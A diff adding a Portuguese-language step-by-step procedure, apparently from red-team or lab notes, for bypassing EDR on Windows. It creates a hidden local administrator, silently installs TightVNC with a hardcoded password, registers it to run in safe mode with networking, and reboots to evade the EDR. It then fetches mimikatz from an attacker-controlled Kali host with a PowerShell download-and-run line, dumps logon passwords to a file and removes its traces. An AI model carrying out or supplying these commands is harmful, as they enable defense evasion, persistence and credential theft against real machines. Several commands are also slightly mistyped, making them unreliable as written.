@@ -1,0 +1,52 @@
+#Procedimento para bypass de EDR 
+#Antes de tudo, criar um usuário local na maquina e adiciona-lo ao grupo de administradores locais 
+
+net user add /add 
+
+# Para verificar o grupo de adm local 
+
+net localgroup 
+net localgroup administrators jimmy /add 
+
+# Tentar logar na maquina com o usuário recem criado 
+# Instalar o VNC server via cmd: 
+# Baixar o arquivo: 
+
+https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi 
+
+# Ir até o diretório onde o arquivo está 
+
+msiexec /i "C:\Users\Administrador\Downloads\tightvnc-2.8.63-gpl-setup-64bit.msi" /quiet /norestart ADDLOCAL="Server,Viewer" VIEWER_ASSOCIATE_VNC_EXTENSION=1 SERVER_REGISTER_AS_SERVICE=1 SERVER_ADD_FIREWALL_EXCEPTION=1 VIEWER_ADD_FIREWALL_EXCEPTION=1 SERVER_ALLOW_SAS=1 SET_USEVNCAUTHENTICATION=1 VALUE_OF_USEVNCAUTHENTICATION=1 SET_PASSWORD=1 VALUE_OF_PASSWORD=labfalcon SET_USECONTROLAUTHENTICATION=1 VALUE_OF_USECONTROLAUTHENTICATION=1 SET_CONTROLPASSWORD=1 VALUE_OF_CONTROLPASSWORD=labfalcon 
+tasklist /v | findStr "server" 
+
+# Acessar a maquina via VNC server para confirmar o acesso e adicionar o registro 
+
+REG COPY HKLM\system\CurrentControlSet\services\tvnserver HKLM\system\CurrentControlSet\control\safeboot\network\tvnserver /s /f 
+
+# Configurar o Windows para dar Reboot no modo de segurança com Network 
+
+Windows + R > msconfig > Iniciar modo de segurança com rede 
+
+# Dar reboot 
+# Logar na maquina via VNC 
+# Fazer upload do mimikatz 
+
+iEx (New-Object System.Net.WebClient).DownloadString('http://<ipdokali>/mimikat.exe'); mimikatz.exe 
+
+#Salvar o output no Temp 
+
+./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt 
+
+# Desfazer as modificações 
+# Ao finalizar o dump, acessar novamente a tela de safe mode e desmarcar a opção 
+# Dar reboot na maquina 
+# Accessar novamente via Evil-Wirm 
+# Desinstalar o VNC 
+
+cd "C:\Program Files\TightVNC" 
+.\tvnserver.exe -remove 
+
+# Digitar o comando 
+
+net user jimmy /delete 
+net localgroup administrators jimmy /delete 
